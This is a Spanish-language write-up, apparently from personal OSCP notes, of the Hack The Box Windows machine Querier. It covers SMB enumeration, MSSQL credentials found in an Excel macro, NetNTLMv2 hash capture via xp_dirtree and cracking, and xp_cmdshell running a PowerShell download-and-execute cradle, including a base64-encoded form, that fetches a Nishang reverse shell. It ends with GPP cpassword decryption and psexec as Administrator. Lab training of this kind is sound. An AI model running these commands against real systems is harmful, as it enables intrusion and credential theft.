---
tags:
  - type/writeup
  - env/windows
  - estado/completo
  - cert/oscp
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/machines/175
dificultad: Media
ip: 10.10.10.125
os: Windows
relacionados:
  - "[[Macro Inspection]]"
  - "[[Olevba]]"
  - "[[MSSQL Hash Stealing]]"
  - "[[Net-NTLMv2]]"
  - "[[Abusing MSSQL]]"
  - "[[Cached GPP Files]]"
  - "[[Abusing xp_cmdshell]]"
---
# HackTheBox - Querier

## Reconocimiento

Mi primer paso en cualquier pentest es realizar un reconocimiento exhaustivo para entender la superficie de ataque. Comencé con un escaneo de puertos utilizando **Nmap** para identificar todos los servicios expuestos en la máquina.

### Escaneo de Puertos con Nmap

Para asegurarme de no omitir ningún puerto, primero realicé un escaneo rápido de todos los 65535 puertos TCP. Luego, ejecuté un segundo escaneo más detallado sobre los puertos descubiertos para identificar las versiones de los servicios y ejecutar scripts de enumeración básicos.
```Bash
sudo nmap -p- -sS --open --min-rate 3000 -vvv -n -Pn $(cat ip) -oG logs/allports
nmap -sCV -p135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669,49670,49671 $(cat ip) --version-all --script-timeout 30s -oN 01_Reconnaissance/sCV
```

Los resultados del escaneo mostraron varios puertos de interés, destacando:
- **SMB (Puerto 445):** Indica que hay recursos compartidos de Windows.
- **MSSQL (Puerto 1433):** Un servidor de base de datos Microsoft SQL Server está en ejecución.
- **WinRM (Puerto 5985):** Sugiere que la administración remota de Windows está habilitada.

### Enumeración de SMB

Dado que el puerto 445 estaba abierto, mi siguiente paso fue enumerar los recursos compartidos disponibles a través de SMB. Utilicé `smbclient` para conectarme con una sesión nula, lo que no requiere credenciales.
```Bash
smbclient -N -L \\\\10.10.10.125
```

Este comando me reveló un recurso compartido interesante llamado `Reports`. Procedí a conectarme a él para explorar su contenido.
```Bash
smbclient -N \\\\10.10.10.125\\Reports
```

Dentro del recurso, encontré un único archivo: `Currency Volume Report.xlsm`.

> [!note] Nota
> 
> Un archivo .xlsm es una hoja de cálculo de Excel que puede contener macros. Desde la perspectiva de un pentester, estos archivos son de alto interés porque las macros (código VBA) a menudo contienen información sensible, como cadenas de conexión a bases de datos o credenciales hardcodeadas.

Descargué el archivo a mi máquina local para analizarlo en detalle.

---

## Análisis de vulnerabilidades

Con el archivo en mi poder, el siguiente paso era analizarlo en busca de debilidades que pudiera explotar.

### Credenciales en Archivo Excel

#### Opción 1: Manual

Para inspeccionar el contenido de la macro sin necesidad de abrirlo en un entorno Windows, descomprimí el archivo `.xlsm` como si fuera un archivo `.zip`.
```Bash
unzip "Currency Volume Report.xlsm"
```

Las macros suelen almacenarse en el archivo `xl/vbaProject.bin`. Utilicé el comando `strings` para extraer todas las cadenas de texto legibles de este archivo binario, esperando encontrar algo útil.
```Bash
strings xl/vbaProject.bin
```

Mi sospecha fue correcta. Casi al principio del resultado, encontré una cadena de conexión que contenía credenciales en texto plano para el servidor MSSQL.

- **Usuario:** `reporting`
- **Contraseña:** `PcwTWTHRwryjc$c6`

#### Opción 2: [[olevab]]

Usar `olevba` de `oletools` en el documento base para encontrar las credenciales:
```bash
olevba Currency\ Volume\ Report.xlsm
```

> [!warning] Vulnerabilidad: Credenciales Hardcodeadas
> 
> Encontrar credenciales en texto plano dentro de archivos de configuración o scripts es una vulnerabilidad crítica. Esto elimina la necesidad de realizar ataques de fuerza bruta y proporciona un punto de entrada directo a otros servicios, en este caso, al servidor MSSQL.

### Pruebas de credenciales con [[netexec]]

Pruebo con el usuario a nivel de dominio:
```bash
netexec smb $(cat ip) -u 'reporting' -p 'PcwTWTHRwryjc$c6'
```
No funciona.

Pruebo a nivel de wordgroup a ver si el usuario existe localmente en la maquina ya que no lo hace a nivel de dominio:
```bash
netexec smb $(cat ip) -u 'reporting' -p 'PcwTWTHRwryjc$c6' -d WORKGROUP
```
Parece que el usuario sí existe. 

Pruebo a ver si el usuario pertenece al grupo `Network Management Users`:
```bash
netexec winrm $(cat ip) -u 'reporting' -p 'PcwTWTHRwryjc$c6'
```
Parece que no.

### Captura de Hashes NetNTLMv2 a través de MSSQL

Aunque tenía credenciales para MSSQL, no sabía qué privilegios tenía el usuario `reporting`. Mi objetivo era obtener ejecución de comandos, pero era probable que este usuario de "solo lectura" no tuviera los permisos necesarios.

Sin embargo, sabía que incluso un usuario con pocos privilegios en MSSQL puede forzar al servidor a realizar una autenticación SMB hacia una máquina controlada por mí. Funciones como `xp_dirtree` o `xp_fileexist`, al intentar acceder a una ruta UNC (ej: `\\attacker-ip\share`), hacen que la cuenta de servicio de MSSQL envíe su hash de contraseña NetNTLMv2. Si podía capturar y crackear ese hash, podría obtener las credenciales de una cuenta potencialmente más privilegiada.

---

## Explotación de vulnerabilidades

### Acceso Inicial a MSSQL y Robo de Hashes

Utilicé el script `mssqlclient.py` de Impacket para autenticarme en el servidor de base de datos con las credenciales que encontré.
```Bash
impacket-mssqlclient.py htb.local/reporting:Password123@10.10.10.125 -windows-auth
```

Una vez dentro, confirmé que no tenía privilegios de administrador del sistema (`sysadmin` o `SA`) al intentar habilitar `xp_cmdshell`, lo cual falló.
```SQL
SQL> enable_xp_cmdshell
[-] xp_cmdshell feature is disabled. Enabling it...
[-] ERROR(S):
[-] The user does not have permission to perform this action.
```

Llegó el momento de ejecutar el ataque de captura de hash. Primero, inicié **Responder** en mi máquina para escuchar las solicitudes de autenticación SMB entrantes.
```Bash
sudo responder -I tun0 -v
```

Luego, desde la sesión de MSSQL, ejecuté el siguiente comando para forzar la autenticación:
```SQL
SQL> EXEC xp_dirtree '\\10.10.14.17\share';
```

Inmediatamente, vi la conexión en mi terminal de Responder, que capturó el hash NetNTLMv2 de la cuenta de servicio `HTB\mssql-svc`.

### Crackeo del Hash NetNTLMv2

Copié el hash capturado en un archivo llamado `hash.txt` y usé **John the Ripper** junto con el diccionario `rockyou.txt` para crackearlo.
```Bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

En poco tiempo, John reveló la contraseña: `corporate568`.
- **Usuario:** `mssql-svc`
- **Contraseña:** `corporate568`

### Acceso como SysAdmin y Shell Reversa

Con estas nuevas credenciales, me volví a conectar al servidor MSSQL.
```Bash
impacket-mssqlclient.py HTB/mssql-svc:corporate568@10.10.10.125 -windows-auth
```

Esta vez, verifiqué si tenía privilegios de `sysadmin`, y la consulta devolvió `1`, confirmando que era administrador de la base de datos.
```SQL
SQL> SELECT IS_SRVROLEMEMBER('sysadmin');
1
```

Ahora sí podía habilitar y usar `xp_cmdshell` para ejecutar comandos en el sistema operativo.
```SQL
SQL> enable_xp_cmdshell
[*] xp_cmdshell feature is disabled. Enabling it...
[*] xp_cmdshell enabled.
SQL> xp_cmdshell whoami
htb\mssql-svc
```

Para obtener una shell interactiva, decidí usar el script de reverse shell en PowerShell de **Nishang**. Modifiqué el script `Invoke-PowerShellTcp.ps1` añadiendo al final una línea para que se ejecutara automáticamente con mi IP y el puerto deseado:
```bash
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.17 -Port 443
```

Levanté un servidor web simple en mi máquina para servir el script:
```Bash
python3 -m http.server 80
```

Desde MSSQL, ejecuté un comando de PowerShell para descargar y ejecutar mi script en memoria.
```SQL
xp_cmdshell "powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.2/Invoke-PowerShellTcp.ps1')"
```
##### Escapando las comillas

Si da error porque no reconoce las comillas correctamente las puedo escapar con `\`:
```sql
xp_cmdshell "powershell IEX(New-Object Net.WebClient).DownloadString(\'http://10.10.16.2/Invoke-PowerShellTcp.ps1\')"
```

##### Escapando con base64

En caso de que siga sin funcionar lo puedo pasar a base64 y así escapar de las comillas:
```bash
echo -n "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.17/Invoke-PowerShellTcp.ps1')" | iconv -t UTF-16LE | base64 -w0
```

Ejecuto la `powershell` con `-enc` para leer el `base64` y ejecutar la shell nishang que estoy compartiendo desde mi pc.
```sql
xp_cmdshell "powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADEANwAvAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAAuAHAAcwAxACcAKQA="
```

Con esto, obtuve una shell interactiva en la máquina como el usuario `htb\mssql-svc`.

---

## Escalada de privilegios

Mi objetivo final es obtener control total del sistema, es decir, escalar privilegios a `NT AUTHORITY\SYSTEM`.

### Enumeración con PowerUp

Una vez en la máquina, utilizo **PowerUp.ps1** de PowerSploit, agregue al final la linea `Invoke-AllChecks` y lo transferí a la máquina de la misma manera que la reverse shell.
```PowerShell
IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.17/PowerUp.ps1")
```

El script rápidamente encontró un hallazgo de alta prioridad: una contraseña en un archivo de Group Policy Preferences (GPP) cacheado.

### Descifrado de Contraseña GPP

PowerUp me mostró la ruta del archivo `Groups.xml` y la contraseña cifrada (`cpassword`) para el usuario **Administrator**.
```XML
C:\ProgramData\Microsoft\Group Policy\History\{...}\Machine\Preferences\Groups\Groups.xml
```

> [!danger] Vulnerabilidad Crítica: Group Policy Preferences (GPP)
> 
> La vulnerabilidad MS14-025 se debe a que las contraseñas almacenadas en las GPP utilizaban una clave de cifrado AES de 32 bytes estática y públicamente conocida. Aunque Microsoft la parcheó, los archivos Groups.xml cacheados pueden permanecer en los sistemas si las políticas no se eliminaron correctamente, permitiendo a un atacante con acceso local descifrar la contraseña y escalar privilegios de forma trivial.

Usé un script de Python que implementa el algoritmo de descifrado con la clave AES pública para obtener la contraseña en texto plano.
```Python
from Crypto.Cipher import AES
from base64 import b64decode

cpassword = "CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ"
key = b"\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b"

# Padding y descifrado
cpassword += "=" * ((4 - len(cpassword) % 4) % 4)
password = b64decode(cpassword)
o = AES.new(key, AES.MODE_CBC, b"\x00" * 16).decrypt(password)
print(o.decode('utf-16-le').rstrip('\x00'))
```

La ejecución del script reveló la contraseña del administrador:

- **Usuario:** `Administrator`
- **Contraseña:** `MyUnclesAreMarioAndLuigi!!1!`
    
### Acceso como Administrator

Con las credenciales del administrador local en mi poder, la escalada de privilegios estaba completa. Para obtener una shell como `NT AUTHORITY\SYSTEM`, utilicé `psexec.py` de Impacket desde mi máquina.
```Bash
impacket-psexec.py Administrator:'MyUnclesAreMarioAndLuigi!!1!'@10.10.10.125
```

Este comando me proporcionó una shell interactiva con los máximos privilegios, completando así el compromiso total de la máquina.


___

## Bandera(s)

> [!FLAG] `flag{user}`
> 10286b7b489fe10b70e10dbf8db9caff
^bandera

> [!FLAG] `flag{root}`
> 75d73eba1e9ae0ff05fc3932400d06f6
^bandera